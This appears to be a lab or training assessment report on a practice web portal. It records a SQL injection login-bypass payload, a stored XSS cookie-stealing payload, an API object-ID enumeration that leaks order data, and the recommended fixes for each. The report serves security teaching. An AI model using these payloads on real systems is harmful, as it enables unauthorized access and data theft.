# OMNI-PORTAL ASSESSMENT REPORT
**Operator:** **Deadline:** April 5 @ 11:59 PM 

## PHASE 1: AUTH BYPASS (SQLi)
* **Payload Used:** [admin' OR '1'='1]
* **Result:** Successfully bypassed login and obtained 'auth_token' cookieadmin' OR '1'='1.

## PHASE 2: CLIENT-SIDE HIJACK (XSS)
* **Stored XSS Payload:** [<script>alert(document.cookie);</script>]
* **Secret Cookie Captured:** [auth_token=SUPPORT_TIER_1_SECRET_TOKEN]

## PHASE 3: API ENUMERATION (BOLA)
* **Insecure Order ID:** [501]
* **Confidential Data Leaked:** [{"amount":"$15,000.00","details":"Confidential Server Lease","order_id":501}]

## PHASE 4: THE REMEDIATION
* **Fix for SQLi:** [Implement Parameterized Queries (Prepared Statements). This separates the SQL code from the user input data, ensuring the interpreter treats user inputs strictly as literals rather than executable commands.] * **Fix for XSS:** [Apply strict Context-Aware Output Encoding (e.g., converting < to &lt; and > to &gt;) before rendering user-supplied data in the browser, alongside implementing a strong Content Security Policy (CSP).]
* **Fix for API BOLA:** [Implement robust Object-Level Access Control Checks on the backend. Every time a request is made to /api/v2/orders/{id}, the server must validate that the authenticated user (auth_token) matches the owner record of that specific order ID in the database before serving the data.]
